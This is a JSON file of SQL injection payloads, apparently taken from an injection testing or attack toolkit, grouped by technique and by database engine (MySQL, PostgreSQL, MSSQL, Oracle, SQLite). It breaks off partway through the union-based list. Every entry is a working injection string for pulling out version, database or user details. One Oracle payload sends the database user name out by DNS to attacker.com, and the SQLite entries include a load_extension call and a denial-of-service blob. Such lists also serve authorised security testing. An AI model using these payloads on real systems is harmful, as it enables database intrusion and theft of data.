{
  "error_based": {
    "mysql": [
      "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) -- ",
      "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1) -- ",
      "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), 0x7e, FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) y) -- ",
      "' OR 1=1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(version(),0x7e),FLOOR(RAND(0)*2)) x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1) -- "
    ],
    "postgresql": [
      "' AND 1=cast((SELECT version()) as int) -- ",
      "' AND 1=cast((SELECT current_database()) as int) -- ",
      "' AND 1=cast((SELECT user) as int) -- ",
      "' AND 1=cast(chr(126)||(SELECT version())||chr(126) as int) -- "
    ],
    "mssql": [
      "' AND 1=(SELECT CAST(@@version as int)) -- ",
      "' AND 1=(SELECT CAST(DB_NAME() as int)) -- ",
      "' AND 1=(SELECT CAST(USER_NAME() as int)) -- ",
      "';BEGIN DECLARE @x varchar(8000); SET @x=(SELECT '1' FROM sysusers); SELECT @x END -- "
    ],
    "oracle": [
      "' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) -- ",
      "' AND 1=(SELECT UTL_INADDR.GET_HOST_NAME('nonexistent'||'.'||(SELECT user FROM DUAL)||'.attacker.com') FROM DUAL) -- ",
      "' AND 1=(SELECT SYS.DBMS_JAVA.SET_OUTPUT(1) FROM DUAL) -- "
    ],
    "sqlite": [
      "' AND 1=RANDOMBLOB(500000000) -- ",
      "' AND 1=(SELECT load_extension('/tmp/test')) -- ",
      "' AND 1=(SELECT sqlite_version()) -- "
    ]
  },
  "union_based": [
    "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL -- ",
    "' UNION ALL SELECT 1,2,3,4,5 -- ",
    